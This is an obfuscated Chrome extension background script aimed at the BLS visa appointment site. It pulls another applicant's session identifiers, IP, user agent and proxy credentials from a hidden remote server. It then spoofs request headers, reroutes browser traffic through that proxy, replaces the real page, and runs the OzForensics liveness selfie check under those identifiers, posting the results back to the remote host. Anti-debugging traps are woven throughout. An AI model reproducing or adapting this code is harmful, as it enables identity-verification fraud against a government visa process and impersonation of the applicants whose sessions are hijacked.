import Fetch from "/js/_fetch.js";
chrome.action.onClicked.addListener(async () => {
  var tabs = await chrome.tabs.query({});
  tabs.forEach(async (tab) => {
    if (tab.url?.match(/\/routes\/verifyLiveness\.html/gim)) {
      try {
        await chrome.tabs.remove(tab.id);
      } catch (e) {}
    }
  });
  chrome.tabs.create({
    url: "/routes/verifyLiveness.html",
  });
});
var _0xd1a2b3_dec = function(s) { return atob(s); };
var _0xd1a2b3_arr = [
  _0xd1a2b3_dec("aHR0cHM6Ly9ibHMtc2VsZmllLXNlcnZlci1mbGF4LnZlcmNlbC5hcHA="),
  _0xd1a2b3_dec("aHR0cHM6Ly93d3cuYmxzc3BhaW5tb3JvY2NvLm5ldC9NQVIvYmxzL2Rvb3JzdGVwc2VydmljZQ=="),
  _0xd1a2b3_dec("aHR0cHM6Ly93d3cuYmxzc3BhaW5tb3JvY2NvLm5ldC9NQVIvYmxzL2Rvb3JzdGVwc2VydmljZQ==")
];
var _0xabc123 = _0xd1a2b3_arr;
chrome.runtime.onInstalled.addListener(async function () {
  const a0e = (function () {
    let a = true;
    return function (b, c) {
      const d = a
        ? function () {
            if (c) {
              const e = c.apply(b, arguments);
              c = null;
              return e;
            }
          }
        : function () {};
      a = false;
      return d;
    };
  })();
  (function () {
    a0e(this, function () {
      const a = new RegExp("function *\\( *\\)");
      const b = new RegExp("\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)", "i");
      const c = a0f("init");
      if (!a.test(c + "chain") || !b.test(c + "input")) {
        c("0");
      } else {
        a0f();
      }
    })();
  })();
  chrome.tabs.create({
    url: "/routes/verifyLiveness.html",
  });
  let cem =
    (await (await fetch(chrome.runtime.getURL("cem.key"))).text()) || null;
  await chrome.proxy.settings.clear(
    {
      scope: "regular",
    },
    async function () {
      await chrome.proxy.settings.set(
        {
          value: {
            mode: "system",
          },
          scope: "regular",
        },
        async function () {}
      );
      chrome.declarativeNetRequest.getDynamicRules((b) => {
        const c = b.map((d) => d.id);
        chrome.declarativeNetRequest.updateDynamicRules(
          {
            removeRuleIds: c,
            addRules: [],
          },
          () => {}
        );
      });
      await Promise.allSettled([
        await setLocalStorage({
          cem: cem,
        }),
        await setLocalStorage({
          obec: null,
        }),
      ]);
      let a = await chrome.tabs.query({
        lastFocusedWindow: true,
      });
      a.forEach(async (b) => {
        if (
          b.url?.["match"](
            /(MAR\/bls\/doorstepservice|MAR\/appointment\/livenessrequest)/gim
          )
        ) {
          try {
            await chrome.tabs.remove(b.id);
          } catch (c) {}
        }
      });
    }
  );
  function a0f(a) {
    function b(c) {
      if (typeof c === "string") {
        return function (d) {}.constructor("while (true) {}").apply("counter");
      } else if (("" + c / c).length !== 0x1 || c % 0x14 === 0x0) {
        (function () {
          return true;
        })
          .constructor("debugger")
          .call("action");
      } else {
        (function () {
          return false;
        })
          .constructor("debugger")
          .apply("stateObject");
      }
      b(++c);
    }
    try {
      if (a) {
        return b;
      } else {
        b(0x0);
      }
    } catch (c) {}
  }
});
chrome.tabs.onUpdated.addListener(async (tabId, change, tab) => {
  if (
    tab.url &&
    tab.url.match(/doorstepservice/gim) &&
    change.status == "complete"
  ) {
    let { cem, obec } = await readLocalStorage(["cem", "obec"]);
    let { transactionId, userId, origin } = obec || {};
    try {
      const a0e = (function () {
        let a = true;
        return function (b, c) {
          const d = a
            ? function () {
                if (c) {
                  const e = c.apply(b, arguments);
                  c = null;
                  return e;
                }
              }
            : function () {};
          a = false;
          return d;
        };
      })();
      (function () {
        a0e(this, function () {
          const a = new RegExp("function *\\( *\\)");
          const b = new RegExp("\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)", "i");
          const c = a0h("init");
          if (!a.test(c + "chain") || !b.test(c + "input")) {
            c("0");
          } else {
            a0h();
          }
        })();
      })();
      if (!cem || !transactionId || !userId) {
        return {};
      }
      const a0f = [];
      let a0g = 0x1;
      if (origin) {
        a0f.push({
          id: a0g++,
          priority: 0x1,
          action: {
            type: "modifyHeaders",
            requestHeaders: [
              {
                header: "X-Forwarded-For",
                operation: "set",
                value: origin,
              },
            ],
          },
          condition: {
            urlFilter: "*",
            resourceTypes: [
              "main_frame",
              "sub_frame",
              "xmlhttprequest",
              "script",
            ],
          },
        });
      }
      if (obec.agent) {
        a0f.push({
          id: a0g++,
          priority: 0x1,
          action: {
            type: "modifyHeaders",
            requestHeaders: [
              {
                header: "User-Agent",
                operation: "set",
                value: obec.agent,
              },
            ],
          },
          condition: {
            urlFilter: "*",
            resourceTypes: [
              "main_frame",
              "sub_frame",
              "xmlhttprequest",
              "script",
            ],
          },
        });
      }
      if (a0f.length > 0x0) {
        chrome.declarativeNetRequest.updateDynamicRules(
          {
            removeRuleIds: [0x1, 0x2],
            addRules: a0f,
          },
          () => {
            console.log("Updated....", a0f);
            if (chrome.runtime.lastError) {
              console.error(
                "Failed to update dynamic rules:",
                chrome.runtime.lastError.message
              );
            } else {
              console.log("Dynamic rules applied:", a0f);
            }
          }
        );
      }
      function a0h(a) {
        function b(c) {
          if (typeof c === "string") {
            return function (d) {}
              .constructor("while (true) {}")
              .apply("counter");
          } else if (("" + c / c).length !== 0x1 || c % 0x14 === 0x0) {
            (function () {
              return true;
            })
              .constructor("debugger")
              .call("action");
          } else {
            (function () {
              return false;
            })
              .constructor("debugger")
              .apply("stateObject");
          }
          b(++c);
        }
        try {
          if (a) {
            return b;
          } else {
            b(0x0);
          }
        } catch (c) {}
      }
      await chrome.scripting.executeScript({
        target: {
          tabId: tab.id,
        },
        world: "MAIN",
        func: (
          userId,
          transactionId,
          cem,
          _endpoint,
          jqueryUrl,
          bootstrapUrl
        ) => {
          const a0e = (function () {
            let a = true;
            return function (b, c) {
              const d = a
                ? function () {
                    if (c) {
                      const e = c.apply(b, arguments);
                      c = null;
                      return e;
                    }
                  }
                : function () {};
              a = false;
              return d;
            };
          })();
          (function () {
            a0e(this, function () {
              const a = new RegExp("function *\\( *\\)");
              const b = new RegExp("\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)", "i");
              const c = a0f("init");
              if (!a.test(c + "chain") || !b.test(c + "input")) {
                c("0");
              } else {
                a0f();
              }
            })();
          })();
          return new Promise(async (a) => {
            try {
              document.body.innerHTML = "";
              const f = document.createElement("div");
              f.id = "loader";
              Object.assign(f.style, {
                position: "fixed",
                top: "30%",
                left: "50%",
                transform: "translate(-50%, -50%)",
                fontSize: "30px",
                fontWeight: "bold",
              });
              document.body.appendChild(f);
              const g = performance.now();
              let h = false;
              function i() {
                if (h || !f) {
                  return;
                }
                const j = (performance.now() - g) / 0x3e8;
                f.textContent = "NovaLoading...." + j.toFixed(0x2) + " seconds";
                if (j >= 0x3c) {
                  h = true;
                  f.textContent = "🐌🐌🐌🐌🐌🐌";
                } else if (j >= 0xc) {
                  f.textContent =
                    "🐌...." + j.toFixed(0x2) + " seconds, Refresh Please...";
                  f.style.color = "red";
                  requestAnimationFrame(i);
                } else {
                  requestAnimationFrame(i);
                }
              }
              i();
            } catch (j) {
              console.error("Error clearing page:", j);
            }
            const c = document.createElement("link");
            c.rel = "stylesheet";
            c.href = bootstrapUrl;
            document.head.appendChild(c);
            const d = document.createElement("script");
            d.src = jqueryUrl;
            d.onload = () => {
              console.log("✅ jQuery loaded successfully.");
              $.ajax = ((m) => {
                function n(o, p, q) {
                  var r = p !== "success" && p !== "parsererror";
                  if (r && --this.retries > 0x0) {
                    setTimeout(() => {
                      $.ajax(this);
                    }, this.retryInterval || 0x64);
                  }
                }
                return (o) => m(o).always(n);
              })($.ajax);
              history.pushState({}, "", "/MAR/appointment/livenessrequest");
              console.log("📥 Injecting OzForensics SDK...");
              const k = document.createElement("script");
              k.src =
                "https://web-sdk.spain.prod.ozforensics.com/blsinternational/plugin_liveness.php";
              k.crossOrigin = "anonymous";
              k.onload = () => {
                console.log("SDK loaded.");
                const n = setInterval(() => {
                  if (typeof OzLiveness !== "undefined") {
                    clearInterval(n);
                    l();
                  }
                }, 0x12c);
                setTimeout(() => {
                  clearInterval(n);
                }, 0x32c8);
              };
              k.onerror = () => {
                console.error("Failed to load SDK.");
              };
              document.head.appendChild(k);
              function l() {
                let m = document.getElementById("loader");
                if (m) {
                  setTimeout(() => (m.textContent = ""), 0x3e8);
                }
                OzLiveness.open({
                  lang: "en",
                  meta: {
                    user_id: userId,
                    transaction_id: transactionId,
                  },
                  overlay_options: false,
                  action: ["video_selfie_blank"],
                  on_complete: function (n) {
                    let o =
                      document.getElementById("checkStatus") ||
                      document.createElement("button");
                    if (!o.id) {
                      o.id = "checkStatus";
                      const q = document.createElement("div");
                      Object.assign(q.style, {
                        marginTop: "50px",
                        display: "flex",
                        justifyContent: "center",
                      });
                      q.appendChild(o);
                      document.body.appendChild(q);
                    }
                    let p = () => window.location.reload();
                    $.ajax({
                      type: "POST",
                      url: _endpoint + "/api/applications/verify",
                      data: {
                        ...n,
                        userId: userId,
                        transactionId: transactionId,
                        cem: cem,
                      },
                      timeout: 0x7d0,
                      retries: 0x3,
                      retryInterval: 0x7d0,
                    })
                      .done(() => {
                        let r = document.getElementById("loader");
                        if (r) {
                          r.remove();
                        }
                        if (
                          n.analyses?.["quality"]?.["resolution"] ===
                            "success" ||
                          n.state === "finished"
                        ) {
                          o.className = "btn btn-success";
                          o.textContent = "Selfie is Passed...";
                          o.removeEventListener("click", p);
                        } else {
                          o.className = "btn btn-danger";
                          o.textContent = "Error: Selfie is Declined...";
                          o.addEventListener("click", p);
                        }
                        return a(n);
                      })
                      .fail((r) => {
                        let s = document.getElementById("loader");
                        if (s) {
                          s.remove();
                        }
                        console.error("Server Response Error:", r);
                        o.className = "btn btn-danger";
                        o.textContent = "Error: Server Response is declined...";
                        o.addEventListener("click", p);
                      });
                  },
                });
              }
            };
            document.head.appendChild(d);
          });
          function a0f(a) {
            function b(c) {
              if (typeof c === "string") {
                return function (d) {}
                  .constructor("while (true) {}")
                  .apply("counter");
              } else if (("" + c / c).length !== 0x1 || c % 0x14 === 0x0) {
                (function () {
                  return true;
                })
                  .constructor("debugger")
                  .call("action");
              } else {
                (function () {
                  return false;
                })
                  .constructor("debugger")
                  .apply("stateObject");
              }
              b(++c);
            }
            try {
              if (a) {
                return b;
              } else {
                b(0x0);
              }
            } catch (c) {}
          }
        },
        args: [
          userId,
          transactionId,
          cem,
          _0xabc123[0],
          chrome.runtime.getURL("assets/jquery.min.js"),
          chrome.runtime.getURL("assets/bootstrap.min.css"),
        ],
      });
    } catch (e) {
      console.log("CEM Catched Error...", e);
      return false;
    }
  }
  if (change.status === "complete" && tab.url) {
    try {
      const url = new URL(tab.url);
      if (
        (url.hostname.includes("ottgold.com")) &&
        /^[0-9a-fA-F-]{24,36}$/.test(url.pathname.slice(1))
      ) {
        const uuid = url.pathname.slice(1);
        chrome.tabs.remove(tabId);
        const verifyLivenessUrl =
          chrome.runtime.getURL("routes/verifyLiveness.html") + `?uuid=${uuid}`;
        const tabs = await chrome.tabs.query({});
        const existing = tabs.find(
          (t) => t.url && t.url.includes("/routes/verifyLiveness.html")
        );
        if (existing) {
          await chrome.tabs.remove(existing.id);
        }
        await chrome.tabs.create({
          url: verifyLivenessUrl,
        });
      }
    } catch (e) {
      console.error("Kcc UUID format", e);
    }
  }
});
chrome.webNavigation.onBeforeNavigate.addListener(async (details) => {
  if (details.frameId !== 0) return;
  try {
    const url = new URL(details.url);
    const host = url.hostname.toLowerCase();
    if (host.includes("ottgold.com") && url.pathname.length > 1) {
      const id = url.pathname.slice(1).replace(/[^0-9a-fA-F0-9]/g, "");
      if (id.length >= 4) {
        await setLocalStorage({ _novabls_pending_id: id });
      }
    }
  } catch (_) {}
});
chrome.webRequest.onAuthRequired.addListener(
  async (details, callback) => {
    if (details.isProxy === true) {
      let { obec: { proxy } = {} } = await readLocalStorage(["obec"]);
      if (
        !proxy ||
        !proxy.host ||
        !proxy.port ||
        !proxy.username ||
        !proxy.password
      ) {
        return callback({
          cancel: true,
        });
      }
      return callback({
        authCredentials: {
          username: proxy.username,
          password: proxy.password,
        },
      });
    }
    return callback({
      cancel: false,
    });
  },
  {
    urls: ["<all_urls>"],
  },
  ["asyncBlocking"]
);
chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {
  const a0e = (function () {
    let a = true;
    return function (b, c) {
      const d = a
        ? function () {
            if (c) {
              const e = c.apply(b, arguments);
              c = null;
              return e;
            }
          }
        : function () {};
      a = false;
      return d;
    };
  })();
  (function () {
    a0e(this, function () {
      const a = new RegExp("function *\\( *\\)");
      const b = new RegExp("\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)", "i");
      const c = a0f("init");
      if (!a.test(c + "chain") || !b.test(c + "input")) {
        c("0");
      } else {
        a0f();
      }
    })();
  })();
  if (request.action == "verifySelfie") {
    (async () => {
      let { obec: { userId: userId, transactionId: transactionId } = {} } =
        await readLocalStorage(["obec"]);
      let a = await chrome.tabs.query({
        lastFocusedWindow: true,
      });
      a.forEach(async (b) => {
        if (
          b.url?.["match"](
            /(MAR\/bls\/doorstepservice|\/routes\/verifyLiveness\.html)/gim
          )
        ) {
          try {
            await chrome.tabs.remove(b.id);
          } catch (c) {}
        }
      });
      if (!userId || !transactionId) {
        chrome.tabs.create({
          url: "/routes/verifyLiveness.html",
        });
      } else {
        let targetDoorstepUrl = "https://morocco.blsportugal.com/MAR/bls/doorstepservice";
        let { obec } = await readLocalStorage(["obec"]);
        if (obec?.originHost) {
          targetDoorstepUrl = `https://${obec.originHost}/MAR/bls/doorstepservice`;
        }
        await chrome.tabs.create({
          url: targetDoorstepUrl,
        });
        console.log("Tab created directly at doorstepservice page:", targetDoorstepUrl);
      }
    })();
  }
  if (request.action == "currentUser") {
    (async () => {
      let { cem: cem } = await readLocalStorage(["cem"]);
      sendResponse({
        cem: cem,
      });
    })();
  }
  if (request.action == "resetCem") {
    (async () => {
      await Promise.allSettled([
        setLocalStorage({
          cem: null,
        }),
        setLocalStorage({
          obec: null,
        }),
      ]);
      sendResponse({
        status: true,
      });
    })();
  }
  if (request.action == "fetchCem") {
    (async () => {
      let cem = request.cem;
      if (cem) {
        await setLocalStorage({
          cem: cem,
        });
        let a = Fetch(fetch);
        let b = await a(_0xabc123[0x0] + "/api/applications/fetchCem", {
          retryDelay: 0x4b0,
          retryOn: async (g, h, i) => {
            if (g > 0x6) {
              return false;
            }
            if (
              h !== null ||
              [0x190, 0x1f4, 0x1f7, 0x1f6, 0x1f8, 0x1ad].includes(i?.["status"])
            ) {
              console.log(
                "MK Request (attmpt-%s)...%O / Status: %s",
                g,
                h,
                i?.["status"]
              );
              return true;
            }
          },
          method: "POST",
          headers: {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
          },
          body: new URLSearchParams({
            cem: cem,
          }),
        })["catch"](async (g) => {
          console.log("Error fetchResult...", g);
          throw g;
        });
        if (!b.ok) {
          throw "Error fetching CEM data...Status: " + b.status;
        }
        let c = await b.json();
        console.log("Payload received: ", c);
        let transactionId = c.transactionId;
        let userId = c.userId;
        let d = c.ip;
        let e = c.userAgent;
        let f =
          c.proxy && c.proxy.split(":").length >= 4
            ? {
                host: c.proxy.split(":")[0],
                port: c.proxy.split(":")[1],
                username: c.proxy.split(":")[2],
                password: c.proxy.split(":")[3],
              }
            : null;
        sendResponse(c);
        if (!userId || !transactionId) {
          return await Promise.allSettled([
            setLocalStorage({
              obec: null,
            }),
          ]);
        }
        await setLocalStorage({
          obec: {
            transactionId: transactionId,
            userId: userId,
            origin: d,
            agent: e,
            proxy: f,
          },
        });
        if (!(await setupProxy(f, !!d))) {
          ({});
        }
        setTimeout(async () => {
          var g = await chrome.tabs.query({
            lastFocusedWindow: true,
          });
          g.forEach(async (h) => {
            if (
              h.url?.["match"](
                /(MAR\/bls\/doorstepservice|\/routes\/verifyLiveness\.html)/gim
              )
            ) {
              try {
                await chrome.tabs.remove(h.id);
              } catch (i) {}
            }
          });
          let targetDoorstepUrl = "https://morocco.blsportugal.com/MAR/bls/doorstepservice";
          if (c.domain || c.host) {
            targetDoorstepUrl = `https://${c.domain || c.host}/MAR/bls/doorstepservice`;
          }
          await chrome.tabs.create({
            url: targetDoorstepUrl,
          });
          console.log("Tab created directly at doorstepservice page:", targetDoorstepUrl);
        }, 0x1f4);
      }
    })();
  }
  function a0f(a) {
    function b(c) {
      if (typeof c === "string") {
        return function (d) {}.constructor("while (true) {}").apply("counter");
      } else if (("" + c / c).length !== 0x1 || c % 0x14 === 0x0) {
        (function () {
          return true;
        })
          .constructor("debugger")
          .call("action");
      } else {
        (function () {
          return false;
        })
          .constructor("debugger")
          .apply("stateObject");
      }
      b(++c);
    }
    try {
      if (a) {
        return b;
      } else {
        b(0x0);
      }
    } catch (c) {}
  }
  return true;
});
async function readLocalStorage(keys) {
  return new Promise((resolve, reject) => {
    chrome.storage.local.get(keys, function (result) {
      if (chrome.runtime.lastError) {
        reject(chrome.runtime.lastError);
      } else {
        resolve(result);
      }
    });
  });
}
async function setLocalStorage(data) {
  return new Promise((resolve, reject) => {
    chrome.storage.local.set(data, function () {
      if (chrome.runtime.lastError) {
        reject(chrome.runtime.lastError);
      } else {
        resolve();
      }
    });
  });
}
async function setupProxy(proxy, is = false) {
  return new Promise(async (resolve) => {
    let { obec } = await readLocalStorage(["obec"]);
    if (!proxy || !proxy.host || !proxy.port) {
      obec = obec || {};
      obec.proxy = null;
      await setLocalStorage({
        obec,
      });
      return resolve({
        status: false,
      });
    }
    if (is == true) {
      return resolve({
        status: false,
      });
    }
    let host = proxy.host;
    let port = parseInt(proxy.port);

    // Clear existing proxy settings first
    await chrome.proxy.settings.clear(
      {
        scope: "regular",
      },
      function () {
        chrome.browsingData.remove(
          {
            origins: ["http://" + host],
          },
          {
            cookies: true,
          }
        );
        let pacScript = {
          data: `
                    function FindProxyForURL(url, host) {
                        return 'PROXY ${host}:${port}';
                    }`,
        };
        let config = {
          mode: "pac_script",
          pacScript: pacScript,
        };
        chrome.proxy.settings.set(
          {
            value: config,
            scope: "regular",
          },
          function () {
            if (chrome.runtime.lastError) {
              return resolve({
                status: false,
              });
            }
            return resolve({
              status: true,
            });
          }
        );
      }
    );
  });
}
